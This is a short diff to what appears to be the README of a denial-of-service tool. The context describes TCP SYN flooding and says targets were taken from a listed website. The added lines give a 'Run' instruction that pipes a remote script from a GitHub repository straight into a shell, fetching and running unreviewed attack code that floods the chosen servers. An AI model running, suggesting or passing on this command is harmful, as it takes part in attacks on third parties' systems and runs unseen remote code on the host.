@@ -4,3 +4,8 @@ A TCP SYN flood is unlikely to break a server by itself
 But like a redditor said: "Death by a thousand paper cuts"
 
 Targets grabbed from from https://norussian.xyz
+
+
+Run
+--
+curl https://raw.githubusercontent.com/urbanon/fck-russia/main/script | sh
